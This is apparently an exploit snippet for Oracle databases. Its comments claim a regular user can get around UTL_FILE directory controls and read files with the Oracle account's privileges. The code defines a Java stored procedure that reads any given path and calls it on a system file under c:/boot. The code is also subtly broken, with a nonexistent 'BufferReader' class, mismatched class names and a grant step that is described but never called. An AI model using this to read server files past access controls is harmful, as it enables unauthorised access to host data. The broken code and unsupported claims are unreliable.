//Using the UTL_FILE package to access the file system  requires that a user has 
//either access to the IDRECTORY object or privielges to create the one 
//Using Java we can bypass this by calling DBMS_JAVA.GRANT_PERMISSION()
//in the outcome regular permissions of the user will be extend so he may get access to the files systems 



//The following code allows regular user to read and write files with the prigileges of the Oralce user 
set serveroutput on 
create or replace and resolve Java  source named "JAVAREADFILE" AS
import java.lang.*;
import java.io.*;

public class JavaREADFILE
{
	public static void readfile(String filename) throws IOException
	
	{
		
		FileReader fr=new FileReader(filename);
		BufferReader br=new BufferReader(fr);
		String text=br.readLine();
		while(text!=null)
		{
			
			System.out.println(text);
			text=br.readLine();
			
		}
		
		br.close();
	}
	
	
	
}

Create or replace procedure  JAVAREADFILEPROC (p_filename in varchar2)
as language java
Name 'JAVAREADFILE.readfile(java.lang.string)';

/
exec dbms_java.set_output(2000);
exec JAVAREADFILEPROC('c:/boot/int');




